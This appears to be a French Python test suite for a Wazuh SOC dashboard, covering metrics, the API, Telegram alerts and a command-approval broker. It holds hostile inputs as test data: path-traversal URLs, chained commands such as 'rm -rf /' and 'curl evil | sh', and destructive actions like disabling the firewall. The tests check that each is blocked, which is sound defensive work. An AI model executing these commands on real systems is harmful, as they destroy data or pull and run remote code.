#!/usr/bin/env python3
"""Tests du tableau de bord SOC : metriques, playbooks, stockage, API de bout en bout.

Lancement : python test_soc.py
Aucun acces Wazuh n'est necessaire : le test pousse un snapshot representatif
dans une instance locale du serveur, sur un port ephemere et une base temporaire.
"""

import json
import os
import sys
import tempfile
import threading
import time
import unittest
import urllib.error
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import playbooks  # noqa: E402
import socstore  # noqa: E402
import summarizer  # noqa: E402

SNAPSHOT = {
    "collected_at": "2026-11-02T19:20:00+00:00",
    "collector": {"version": "1.0", "host": "zbook-hp"},
    "manager": {"version": "v4.14.9"},
    "host": {"hostname": "zbook-hp"},
    "agents": [
        {"id": "000", "name": "wazuh.manager", "status": "active", "os": "Amazon Linux", "os_version": "2023"},
        {"id": "002", "name": "zbook-hp", "status": "active", "os": "Microsoft Windows 11 Pro", "os_version": "10.0.26300"},
        {"id": "003", "name": "poste-muet", "status": "disconnected", "os": "Microsoft Windows 10"},
    ],
    "alerts": {
        "total_24h": 921,
        "by_level": {"3": 824, "4": 48, "5": 39, "7": 2, "9": 4, "10": 2, "12": 2},
        "top_rules": [{"key": "Windows Logon Success", "count": 640},
                      {"key": "Windows Logon Failure", "count": 48}],
        "by_agent": [{"key": "zbook-hp", "count": 920}],
        "top_sources": [{"key": "192.0.2.10", "count": 12}],
        "top_mitre": [{"key": "T1110", "count": 48}],
        "timeline": [{"ts": "2026-11-02T18:00:00.000+0000", "count": 3}],
    },
    "vulnerabilities": {"total": 12, "by_severity": {"Critical": 2, "Medium": 7, "Low": 3}, "by_agent": []},
    "errors": [],
    "recent_alerts": [
        {"ts": "2026-11-02T19:17:47+00:00", "agent": "zbook-hp", "rule_id": "5710", "level": 12,
         "description": "Multiple failed logins (brute force)", "groups": ["authentication_failure"],
         "mitre_ids": ["T1110"], "srcip": "192.0.2.10", "playbook": "brute_force",
         "fingerprint": "abc123"},
        {"ts": "2026-11-02T19:15:00+00:00", "agent": "zbook-hp", "rule_id": "550", "level": 7,
         "description": "Integrity checksum changed", "groups": ["syscheck"], "mitre_ids": [],
         "playbook": "fim_change", "fingerprint": "def456"},
    ],
}


class TestMetrics(unittest.TestCase):
    def test_compute_metrics(self):
        m = summarizer.compute_metrics(SNAPSHOT)
        self.assertEqual(m["agents_total"], 3)
        self.assertEqual(m["agents_active"], 2)
        self.assertEqual(m["alerts_24h"], 921)
        self.assertEqual(m["alerts_critique"], 2)     # niveau 12
        self.assertEqual(m["alerts_eleve"], 6)        # 9 et 10
        self.assertEqual(m["vulns_critique"], 2)
        self.assertIn("poste-muet", m["agents_down"])
        self.assertGreaterEqual(m["score"], 0)
        self.assertLessEqual(m["score"], 100)

    def test_score_penalise_absence_et_critiques(self):
        sain = summarizer.posture_score(3, 3, 0, 0)
        degrade = summarizer.posture_score(1, 3, 5, 8)
        self.assertEqual(sain, 100)
        self.assertLess(degrade, sain)


class TestSummary(unittest.TestCase):
    def test_bilan_regles_cite_les_chiffres(self):
        out = summarizer.summarize(SNAPSHOT, prefer_llm=False)
        self.assertEqual(out["engine"], "regles")
        txt = out["text"]
        for attendu in ("921", "3 poste(s) surveille(s)", "2 actif(s)", "poste-muet",
                        "vulnerabilite", "Windows Logon Success"):
            self.assertIn(attendu, txt)
        self.assertIn("## Priorites de reponse", txt)

    def test_llm_indisponible_bascule_sur_regles(self):
        os.environ["SOC_LLM_API_KEY"] = "cle-factice"
        os.environ["SOC_LLM_BASE_URL"] = "http://127.0.0.1:9/v1"   # port ferme
        try:
            out = summarizer.summarize(SNAPSHOT, prefer_llm=True)
        finally:
            os.environ.pop("SOC_LLM_API_KEY", None)
        self.assertEqual(out["engine"], "regles")
        self.assertIn("LLM indisponible", out["fallback"])

    def test_llm_chemin_complet_via_stub(self):
        """Le chemin LLM est verifie de bout en bout contre un faux fournisseur local :
        le snapshot part bien en HTTP et le texte du modele remplace le moteur de regles."""
        import threading
        import llm_stub

        httpd, port = llm_stub.serve(0)
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        os.environ["SOC_LLM_API_KEY"] = "stub"
        os.environ["SOC_LLM_BASE_URL"] = "http://127.0.0.1:%d/v1" % port
        os.environ["SOC_LLM_MODEL"] = "stub-model"
        try:
            out = summarizer.summarize(SNAPSHOT, prefer_llm=True)
        finally:
            for k in ("SOC_LLM_API_KEY", "SOC_LLM_BASE_URL", "SOC_LLM_MODEL"):
                os.environ.pop(k, None)
            httpd.shutdown()
            httpd.server_close()

        self.assertEqual(out["engine"], "llm")
        self.assertEqual(out["model"], "stub-model")
        self.assertIsNone(out["fallback"])
        self.assertIn("921", out["text"])                 # les chiffres du snapshot ont transite
        self.assertIn("2 poste(s) actif(s)", out["text"])

    def test_bilan_vide_ne_plante_pas(self):
        out = summarizer.summarize({"collected_at": "2026-11-02T00:00:00+00:00"}, prefer_llm=False)
        self.assertIn("## Situation", out["text"])


class TestPlaybooks(unittest.TestCase):
    def test_mapping_par_regle(self):
        self.assertEqual(playbooks.match({"rule": {"id": "5710"}}), "brute_force")
        self.assertEqual(playbooks.match({"rule": {"id": "550"}}), "fim_change")

    def test_mapping_par_description(self):
        self.assertEqual(playbooks.match({"rule": {"description": "YARA malware detected"}}), "malware")
        self.assertEqual(playbooks.match({"rule": {"description": "Critical CVE-2026-1234"}}), "vulnerability")

    def test_toutes_les_cles_ont_etapes_et_commandes(self):
        for key in playbooks.PLAYBOOKS:
            p = playbooks.get(key)
            self.assertTrue(p["steps"], key)
            self.assertTrue(p["commands"], key)
            self.assertTrue(p["title"], key)

    def test_repli_general(self):
        self.assertEqual(playbooks.match({"rule": {"description": "unknown event"}}), "generic_high")


class TestStoreAndApi(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="socdb-")
        socstore.DB_PATH = os.path.join(self.tmp, "test.db")
        socstore.init()
        os.environ["SOC_INGEST_TOKEN"] = "jeton-test"
        os.environ.pop("SOC_LLM_API_KEY", None)

        import app
        from http.server import ThreadingHTTPServer
        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), app.Handler)
        self.port = self.httpd.server_address[1]
        self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
        self.thread.start()
        self.base = "http://127.0.0.1:%d" % self.port

    def tearDown(self):
        self.httpd.shutdown()
        self.httpd.server_close()
        socstore.DB_PATH = os.path.join(HERE, "soc.db")

    def _get(self, path, token=None, raw=False):
        req = urllib.request.Request(self.base + path)
        if token:
            req.add_header("X-SOC-Token", token)
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                body = r.read().decode("utf-8", "replace")
                return r.status, (body if raw else json.loads(body))
        except urllib.error.HTTPError as exc:
            body = exc.read().decode("utf-8", "replace")
            return exc.code, (body if raw else json.loads(body))

    def _post(self, path, body, token=None):
        req = urllib.request.Request(self.base + path, data=json.dumps(body).encode("utf-8"), method="POST")
        req.add_header("Content-Type", "application/json")
        if token:
            req.add_header("Authorization", "Bearer " + token)
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                return r.status, json.loads(r.read().decode("utf-8"))
        except urllib.error.HTTPError as exc:
            return exc.code, json.loads(exc.read().decode("utf-8"))

    def test_1_ingestion_refusee_sans_jeton(self):
        status, body = self._post("/api/ingest", SNAPSHOT)
        self.assertEqual(status, 401)
        self.assertIn("jeton", body["error"])

    def test_2_cycle_complet(self):
        status, body = self._post("/api/ingest", SNAPSHOT, token="jeton-test")
        self.assertEqual(status, 202)
        self.assertTrue(body["ok"])
        self.assertEqual(body["alerts_new"], 2)

        status, ov = self._get("/api/overview")
        self.assertEqual(status, 200)
        self.assertTrue(ov["ready"])
        self.assertEqual(ov["kpi"]["alerts_24h"], 921)
        self.assertEqual(ov["kpi"]["agents_active"], 2)
        self.assertEqual(len(ov["agents"]), 3)
        self.assertEqual(len(ov["recent_alerts"]), 2)
        self.assertTrue(ov["summary"]["text"])

        status, summ = self._get("/api/summary")
        self.assertEqual(status, 200)
        self.assertIn("921", summ["summary"]["text"])

        status, alerts = self._get("/api/alerts?level=8")
        self.assertEqual(status, 200)
        self.assertEqual(len(alerts["alerts"]), 1)
        self.assertEqual(alerts["alerts"][0]["playbook"], "brute_force")

        status, pb = self._get("/api/playbook/brute_force")
        self.assertEqual(status, 200)
        self.assertIn("steps", pb["playbook"])

    def test_3_doublons_non_reinseres(self):
        self._post("/api/ingest", SNAPSHOT, token="jeton-test")
        _, body = self._post("/api/ingest", SNAPSHOT, token="jeton-test")
        self.assertEqual(body["alerts_new"], 0)

    def test_4_page_accueil_servie(self):
        with urllib.request.urlopen(self.base + "/", timeout=10) as r:
            html = r.read().decode("utf-8")
        self.assertEqual(r.status, 200)
        self.assertIn("Tableau de bord", html)
        self.assertIn("/api/overview", html)

    def test_5_traversee_de_chemin_refusee(self):
        status, page = self._get("/static/index.html", raw=True)
        self.assertEqual(status, 200)
        self.assertIn("Tableau de bord", page)
        for mauvais in ("/static/../app.py", "/static/%2e%2e%2fapp.py",
                        "/static/..%2fapp.py", "/static/..%5capp.py",
                        "/static/%2e%2e/%2e%2e/socstore.py"):
            status, body = self._get(mauvais, raw=True)
            self.assertIn(status, (403, 404), mauvais)
            self.assertNotIn("SOC_INGEST_TOKEN", body)


    def test_6_jeton_de_lecture(self):
        os.environ["SOC_READ_TOKEN"] = "lecture-test"
        try:
            status, _ = self._get("/api/overview")
            self.assertEqual(status, 401)
            status, _ = self._get("/api/overview", token="mauvais")
            self.assertEqual(status, 401)
            status, ov = self._get("/api/overview", token="lecture-test")
            self.assertEqual(status, 200)
            self._post("/api/ingest", SNAPSHOT, token="jeton-test")
            status, ov = self._get("/api/overview", token="lecture-test")
            self.assertEqual(status, 200)
            self.assertTrue(ov["ready"])
            # la page HTML reste servie : c'est elle qui demande le jeton
            status, page = self._get("/", raw=True)
            self.assertEqual(status, 200)
            self.assertIn("Jeton de lecture requis", page)
        finally:
            os.environ.pop("SOC_READ_TOKEN", None)


class TestFindings(unittest.TestCase):
    """Diagnostic automatique : chaque situation doit produire (ou non) le bon constat."""

    def _snap(self, **over):
        snap = {
            "collected_at": "2026-11-02T19:20:00+00:00",
            "agents": [{"id": "002", "name": "zbook-hp", "status": "active"}],
            "alerts": {"total_24h": 100, "by_level": {"3": 100}},
            "stack": {"available": True, "indexer_health": "green",
                      "containers": [{"name": "single-node-wazuh.manager-1", "status": "Up 1 hour"}],
                      "enrollment_rejected_30m": 0},
            "errors": [],
        }
        snap.update(over)
        return snap

    def test_soc_sain_aucun_constat(self):
        self.assertEqual(summarizer.findings(self._snap()), [])

    def test_silence_24h(self):
        titres = [f["title"] for f in summarizer.findings(self._snap(alerts={"total_24h": 0}))]
        self.assertIn("Aucun signal sur 24 h", titres)

    def test_api_muette(self):
        f = summarizer.findings(self._snap(agents=[], errors=["agents: HTTPError: 401"]))
        self.assertTrue(any("API Wazuh muette" in x["title"] for x in f))
        self.assertTrue(any(x["actions"] for x in f))

    def test_poste_injoignable(self):
        f = summarizer.findings(self._snap(agents=[{"name": "poste-muet", "status": "disconnected"}]))
        self.assertTrue(any("injoignable" in x["title"] for x in f))

    def test_conteneur_arrete_est_critique(self):
        f = summarizer.findings(self._snap(stack={
            "available": True, "indexer_health": "green", "enrollment_rejected_30m": 0,
            "containers": [{"name": "single-node-wazuh.indexer-1", "status": "Exited (1) 3 min ago"}],
        }))
        crit = [x for x in f if x["level"] == "critique"]
        self.assertTrue(crit)
        self.assertIn("indexer-1", crit[0]["title"])

    def test_indexeur_rouge(self):
        f = summarizer.findings(self._snap(stack={
            "available": True, "indexer_health": "red", "enrollment_rejected_30m": 0, "containers": [],
        }))
        self.assertTrue(any("Indexeur" in x["title"] and x["level"] == "eleve" for x in f))

    def test_enrolements_refuses(self):
        f = summarizer.findings(self._snap(stack={
            "available": True, "indexer_health": "green", "enrollment_rejected_30m": 42, "containers": [],
        }))
        self.assertTrue(any("enrolement" in x["title"] for x in f))

    def test_pile_non_inspectable(self):
        f = summarizer.findings(self._snap(stack={"available": False, "error": "WSL/Docker injoignable"}))
        self.assertTrue(any("non inspectable" in x["title"] for x in f))


class TestNotifier(unittest.TestCase):
    """Messages Telegram : contenu, seuil d'alerte, anti-doublon. Aucun envoi reel."""

    def setUp(self):
        import notifier
        self.notifier = notifier
        self.tmp = tempfile.mkdtemp(prefix="socnotif-")
        socstore.DB_PATH = os.path.join(self.tmp, "n.db")
        socstore.init()
        self.snap = {
            "collected_at": "2026-11-02T20:42:00+00:00",
            "agents": [{"name": "zbook-hp", "status": "active"}],
            "alerts": {"total_24h": 959, "by_level": {"3": 950, "12": 2}},
            "stack": {"available": True, "indexer_health": "green", "enrollment_rejected_30m": 0,
                      "containers": [{"name": "m", "status": "Up"}]},
            "vulnerabilities": {"total": 1, "by_severity": {"Critical": 0}},
            "errors": [],
        }

    def test_message_alerte_contient_chiffres_et_action(self):
        findings = [{"level": "critique", "title": "Conteneur arrete : indexer-1",
                     "actions": ["docker start indexer-1"]}]
        msg = self.notifier.build_alert_message(self.snap, findings)
        self.assertIn("critique", msg)
        self.assertIn("959", msg)
        self.assertIn("indexer-1", msg)
        self.assertIn("docker start indexer-1", msg)
        self.assertIn("96/100" if "96/100" in msg else "score", msg)

    def test_message_sain(self):
        msg = self.notifier.build_alert_message(self.snap, [])
        self.assertIn("rien à signaler", msg)
        self.assertIn("Aucun constat bloquant", msg)

    def test_seuil_alerte(self):
        ok, cle = self.notifier.should_alert([{"level": "moyen", "title": "Indexeur yellow"}], 900)
        self.assertFalse(ok)
        ok, cle = self.notifier.should_alert([{"level": "critique", "title": "Conteneur arrete"}], 900)
        self.assertTrue(ok)

    def test_anti_doublon(self):
        findings = [{"level": "critique", "title": "Conteneur arrete : indexer-1"}]
        ok1, cle = self.notifier.should_alert(findings, 900)
        self.assertTrue(ok1)
        socstore.mark_notified(cle)
        ok2, _ = self.notifier.should_alert(findings, 900)
        self.assertFalse(ok2, "le meme constat ne doit pas etre renvoye dans la fenetre de cooldown")

    def test_notifications_desactivees(self):
        os.environ["SOC_NOTIFY"] = "0"
        try:
            res = self.notifier.maybe_notify(self.snap, [{"level": "critique", "title": "x"}])
        finally:
            os.environ.pop("SOC_NOTIFY", None)
        self.assertFalse(res["sent"])
        self.assertIn("desactivees", res["reason"])

    def test_sans_identifiants_pas_d_envoi(self):
        os.environ.pop("SOC_TELEGRAM_TOKEN", None)
        os.environ.pop("SOC_TELEGRAM_CHAT_ID", None)
        res = self.notifier.maybe_notify(self.snap, [{"level": "critique", "title": "x"}])
        self.assertFalse(res["sent"])
        self.assertIn("absents", res["reason"])

    def test_message_bilan(self):
        msg = self.notifier.build_digest_message(self.snap, "## Situation en une phrase\nSur les 24 dernieres heures, 959 alertes.")
        self.assertIn("[SOC] Bilan", msg)
        self.assertIn("959", msg)

    def test_messages_lisibles_sans_emoji(self):
        """Un emoji s'affiche en '??' sur certains clients : les messages doivent
        rester lisibles en ASCII etendu (tags de severite)."""
        alertes = self.notifier.build_alert_message(
            self.snap, [{"level": "critique", "title": "Conteneur arrete", "actions": ["docker start x"]}])
        sain = self.notifier.build_alert_message(self.snap, [])
        bilan = self.notifier.build_digest_message(self.snap, "Sur les 24 heures, 959 alertes.")
        for msg in (alertes, sain, bilan):
            hors_ascii = {c for c in msg if ord(c) > 0x2200}
            self.assertFalse(hors_ascii, "caractères à risque : %r" % hors_ascii)
        self.assertIn("[CRITIQUE]", alertes)


class TestBroker(unittest.TestCase):
    """Broker d'autorisation : politique, blocage par defaut, decision, expiration."""

    def setUp(self):
        import broker
        self.broker = broker
        self.tmp = tempfile.mkdtemp(prefix="socbroker-")
        broker.DB_PATH = os.path.join(self.tmp, "b.db")
        broker.init()
        # Pas d'envoi reel : notify_request devient un no-op qui simule Telegram.
        self._vrai_notify = broker.notify_request
        broker.notify_request = lambda *a, **k: 999
        self._vrai_notify_decision = broker.notify_decision
        broker.notify_decision = lambda *a, **k: None

    def tearDown(self):
        self.broker.notify_request = self._vrai_notify
        self.broker.notify_decision = self._vrai_notify_decision

    def test_politique_actions_sensibles(self):
        for action in ("docker restart single-node-wazuh.indexer-1",
                       "docker rm -f single-node-wazuh.manager-1",
                       "netsh advfirewall set allprofiles state off",
                       "iptables -A INPUT -j DROP",
                       "git push origin main",
                       "rm -rf /var/ossec"):
            risque, _ = self.broker.classify(action)
            self.assertIn(risque, ("critique", "eleve", "moyen"), action)

    def test_politique_lecture_seule_sans_demande(self):
        for action in ("docker ps", "docker logs --tail 20 x", "git status",
                       "curl -sk https://localhost:9200/_cluster/health", "ls -la"):
            risque, _ = self.broker.classify(action)
            self.assertIsNone(risque, action)

    def test_demande_bloquee_par_defaut(self):
        code, risque, libelle = self.broker.new_request("docker stop single-node-wazuh.manager-1")
        row = self.broker.get(code)
        self.assertEqual(row["status"], "pending")
        self.assertEqual(row["risk"], "critique")
        self.assertTrue(libelle)
        self.assertIn(code, [r["id"] for r in self.broker.list_requests()])

    def test_execution_refusee_tant_que_non_approuvee(self):
        code, _, _ = self.broker.new_request("docker rm -f single-node-wazuh.indexer-1")
        ok, msg = self.broker.execute(code)
        self.assertFalse(ok)
        self.assertIn("refusee", msg)

    def test_approbation_puis_execution(self):
        code, _, _ = self.broker.new_request('echo "action approuvee"')
        ok, _ = self.broker.approve(code, "test")
        self.assertTrue(ok)
        ok, sortie = self.broker.execute(code)
        self.assertTrue(ok)
        self.assertIn("action approuvee", sortie)
        self.assertEqual(self.broker.get(code)["status"], "executed")
        # une action ne s'execute pas deux fois
        ok2, msg2 = self.broker.execute(code)
        self.assertFalse(ok2)

    def test_refus(self):
        code, _, _ = self.broker.new_request("git push origin main")
        self.assertTrue(self.broker.deny(code, "test", "pas maintenant")[0])
        self.assertEqual(self.broker.get(code)["status"], "denied")
        self.assertFalse(self.broker.execute(code)[0])

    def test_expiration_refus_par_defaut(self):
        code, _, _ = self.broker.new_request("docker restart x", ttl=1)
        time.sleep(2.2)
        ok, msg = self.broker.approve(code)
        self.assertFalse(ok)
        self.assertIn("expire", msg)
        self.assertEqual(self.broker.get(code)["status"], "expired")

    def test_journal_audit(self):
        code, _, _ = self.broker.new_request("docker stop x")
        self.broker.approve(code, "cli")
        with self.broker.connect() as conn:
            events = [r["event"] for r in conn.execute(
                "SELECT event FROM approval_audit WHERE approval_id = ? ORDER BY id", (code,))]
        self.assertEqual(events[:2], ["demande", "approbation"])

    def test_parse_update_bouton(self):
        maj = {"callback_query": {"id": "1", "data": "approve:ab12cd34",
                                  "from": {"id": 42}, "message": {"chat": {"id": 42}}}}
        code, decision, acteur = self.broker.parse_update(maj)
        self.assertEqual((code, decision), ("ab12cd34", "approved"))
        self.assertIn("42", acteur)

    def test_parse_update_bouton_refus(self):
        maj = {"callback_query": {"id": "1", "data": "deny:ab12cd34", "from": {"id": 42},
                                  "message": {"chat": {"id": 42}}}}
        self.assertEqual(self.broker.parse_update(maj)[:2], ("ab12cd34", "denied"))

    def test_parse_update_texte(self):
        maj = {"message": {"text": "approuver ab12cd34", "from": {"id": 42}, "chat": {"id": 42}}}
        self.assertEqual(self.broker.parse_update(maj)[:2], ("ab12cd34", "approved"))
        maj = {"message": {"text": "refuser ab12cd34", "from": {"id": 42}, "chat": {"id": 42}}}
        self.assertEqual(self.broker.parse_update(maj)[:2], ("ab12cd34", "denied"))

    def test_parse_update_ignore_le_reste(self):
        self.assertEqual(self.broker.parse_update({"message": {"text": "bonjour"}})[:2], (None, None))
        self.assertEqual(self.broker.parse_update({})[:2], (None, None))

    def test_details_html_echappes(self):
        """Un detail contenant <id> ou & faisait echouer Telegram (400) : doit etre echappe."""
        self.assertEqual(self.broker._e("lancer wait <id> --exec"),
                         "lancer wait &lt;id&gt; --exec")
        self.assertEqual(self.broker._e("a & b"), "a &amp; b")

    def test_enveloppe_wsl_ne_contourne_pas_la_politique(self):
        """Sur ce poste, docker vit dans WSL : `wsl -d wazuh -e docker rm` doit
        etre classe comme `docker rm`, sinon la politique est vide."""
        self.assertEqual(self.broker.classify("wsl -d wazuh -e docker rm -f x")[0], "critique")
        self.assertEqual(self.broker.classify("wsl.exe -d wazuh -- docker stop x")[0], "critique")
        self.assertIsNone(self.broker.classify("wsl -d wazuh -e docker ps")[0])
        self.assertEqual(self.broker.normalize("wsl -d wazuh -e docker restart x"),
                         "docker restart x")

    def test_enveloppe_shell_ne_cache_pas_l_action(self):
        """`sh -c "docker rm x"` ou `cmd /c "del /s"` : la vraie commande doit etre vue."""
        self.assertEqual(self.broker.classify('wsl -d wazuh -e sh -c "docker rm -f x"')[0],
                         "critique")
        self.assertEqual(self.broker.classify('sh -c "docker stop y"')[0], "critique")
        self.assertEqual(self.broker.classify('cmd /c "del /s C:\\data"')[0], "critique")
        self.assertIsNone(self.broker.classify('wsl -e sh -c "docker logs --tail 5 m"')[0])

    def test_metacaracteres_refuses(self):
        """Une commande approuvee ne doit pas pouvoir embarquer une seconde commande."""
        for action in ("docker restart x; rm -rf /", "docker restart x && curl evil | sh",
                       "docker restart x `whoami`", "docker restart x > /etc/passwd"):
            argv, erreur = self.broker.build_argv(action)
            self.assertIsNotNone(erreur, action)
        code, _, _ = self.broker.new_request("docker restart x; rm -rf /tmp/x", risk="critique")
        self.broker.approve(code, "test")
        ok, msg = self.broker.execute(code)
        self.assertFalse(ok)
        self.assertIn("metacaractere", msg)
        self.assertEqual(self.broker.get(code)["status"], "denied")

    def test_execution_sans_shell(self):
        code, _, _ = self.broker.new_request("echo bonjour", risk="moyen")
        self.broker.approve(code, "test")
        ok, sortie = self.broker.execute(code)
        self.assertTrue(ok)
        self.assertIn("bonjour", sortie)

    def test_detecte_un_redemarrage_sans_autorisation(self):
        self.broker._state_set("containers_baseline", json.dumps(
            {"single-node-wazuh.manager-1": 1000.0}))
        self.broker.containers_uptime = lambda *a, **k: (
            {"single-node-wazuh.manager-1": (True, time.time() - 60)}, None)
        res = self.broker.detect(notify=False)
        self.assertTrue(res["ok"])
        self.assertEqual(len(res["anomalies"]), 1)
        self.assertEqual(res["anomalies"][0]["conteneur"], "single-node-wazuh.manager-1")

    def test_redemarrage_autorise_pas_d_anomalie(self):
        self.broker._state_set("containers_baseline", json.dumps(
            {"single-node-wazuh.indexer-1": 1000.0}))
        self.broker.containers_uptime = lambda *a, **k: (
            {"single-node-wazuh.indexer-1": (True, time.time() - 30)}, None)
        code, _, _ = self.broker.new_request(
            "wsl -d wazuh -e docker restart single-node-wazuh.indexer-1", risk="critique")
        self.broker.approve(code, "test")
        with self.broker.connect() as conn:
            conn.execute("UPDATE approvals SET status='executed', executed_at=? WHERE id=?",
                         (self.broker._iso(self.broker._now()), code))
        res = self.broker.detect(notify=False)
        self.assertEqual(res["anomalies"], [])

    def test_shield_bloque_une_commande_sensible(self):
        import subprocess
        import shield
        os.environ.pop("SOC_APPROVAL_ID", None)
        shield.install(agent="test", audit_log=False)
        try:
            with self.assertRaises(shield.CommandeRefusee):
                subprocess.run(["docker", "rm", "-f", "single-node-wazuh.manager-1"],
                               capture_output=True)
            sortie = subprocess.run(["echo", "lecture"], capture_output=True, text=True)
            self.assertIn("lecture", sortie.stdout)
        finally:
            shield.uninstall()

    def test_shield_consomme_une_approbation(self):
        import shield
        code, _, _ = self.broker.new_request("docker rm -f conteneur-demo", risk="critique")
        self.broker.approve(code, "test")
        os.environ["SOC_APPROVAL_ID"] = code
        shield.install(agent="test", audit_log=False)
        try:
            shield._verifier(["docker", "rm", "-f", "conteneur-demo"])
        finally:
            shield.uninstall()
            os.environ.pop("SOC_APPROVAL_ID", None)
        self.assertEqual(self.broker.get(code)["status"], "executed")
        # deuxieme usage : l'approbation est deja consommee
        os.environ["SOC_APPROVAL_ID"] = code
        shield.install(agent="test", audit_log=False)
        try:
            with self.assertRaises(shield.CommandeRefusee):
                shield._verifier(["docker", "rm", "-f", "conteneur-demo"])
        finally:
            shield.uninstall()
            os.environ.pop("SOC_APPROVAL_ID", None)

    def test_shield_refuse_une_approbation_qui_ne_correspond_pas(self):
        import shield
        code, _, _ = self.broker.new_request("docker restart x", risk="critique")
        self.broker.approve(code, "test")
        os.environ["SOC_APPROVAL_ID"] = code
        shield.install(agent="test", audit_log=False)
        try:
            with self.assertRaises(shield.CommandeRefusee):
                shield._verifier(["docker", "rm", "-f", "autre"])
        finally:
            shield.uninstall()
            os.environ.pop("SOC_APPROVAL_ID", None)

    def test_watch_applique_un_bouton_telegram(self):
        """Le veilleur Telegram doit transformer un appui bouton en decision."""
        code, _, _ = self.broker.new_request("docker stop x")
        os.environ["SOC_TELEGRAM_TOKEN"] = "jeton-test"
        os.environ["SOC_TELEGRAM_CHAT_ID"] = "42"
        appels = []
        file_updates = [{"update_id": 7, "callback_query": {
            "id": "cb1", "data": "approve:%s" % code, "from": {"id": 42},
            "message": {"chat": {"id": 42}}}}]

        def faux_tg(method, **params):
            appels.append(method)
            if method == "getUpdates":
                if file_updates:
                    return {"ok": True, "result": [file_updates.pop(0)]}
                raise KeyboardInterrupt
            return {"ok": True, "result": True}

        vrai_tg = self.broker.tg
        self.broker.tg = faux_tg
        try:
            self.broker.watch(poll_seconds=0.01)
        except KeyboardInterrupt:
            pass
        finally:
            self.broker.tg = vrai_tg
        self.assertEqual(self.broker.get(code)["status"], "approved")
        self.assertIn("answerCallbackQuery", appels)

    def test_watch_ignore_un_chat_non_autorise(self):
        code, _, _ = self.broker.new_request("docker stop x")
        os.environ["SOC_TELEGRAM_TOKEN"] = "jeton-test"
        os.environ["SOC_TELEGRAM_CHAT_ID"] = "42"
        file_updates = [{"update_id": 8, "callback_query": {
            "id": "cb2", "data": "approve:%s" % code, "from": {"id": 999},
            "message": {"chat": {"id": 999}}}}]

        def faux_tg(method, **params):
            if method == "getUpdates":
                if file_updates:
                    return {"ok": True, "result": [file_updates.pop(0)]}
                raise KeyboardInterrupt
            return {"ok": True, "result": True}

        vrai_tg = self.broker.tg
        self.broker.tg = faux_tg
        try:
            self.broker.watch(poll_seconds=0.01)
        except KeyboardInterrupt:
            pass
        finally:
            self.broker.tg = vrai_tg
        self.assertEqual(self.broker.get(code)["status"], "pending")


class TestSummaryFreshness(unittest.TestCase):
    """Un bilan ne doit jamais decrire des donnees plus anciennes que le dernier snapshot."""

    def setUp(self):
        import app
        self.app = app

    def _iso(self, seconds_ago):
        from datetime import datetime, timedelta, timezone
        return (datetime.now(timezone.utc) - timedelta(seconds=seconds_ago)).isoformat(timespec="seconds")

    def test_bilan_anterieur_aux_donnees_est_perime(self):
        last = {"generated_at": self._iso(900)}       # redige il y a 15 min
        snap = {"collected_at": self._iso(5)}         # donnees toutes fraiches
        self.assertTrue(self.app._summary_is_stale(last, snap))

    def test_bilan_a_jour_n_est_pas_regenere(self):
        last = {"generated_at": self._iso(30)}
        snap = {"collected_at": self._iso(20)}
        self.assertFalse(self.app._summary_is_stale(last, snap))

    def test_force_regenere_toujours(self):
        last = {"generated_at": self._iso(10)}
        snap = {"collected_at": self._iso(5)}
        self.assertTrue(self.app._summary_is_stale(last, snap, force=True))

    def test_absence_de_bilan_declenche_generation(self):
        self.assertTrue(self.app._summary_is_stale(None, {"collected_at": self._iso(1)}))


if __name__ == "__main__":
    unittest.main(verbosity=2)
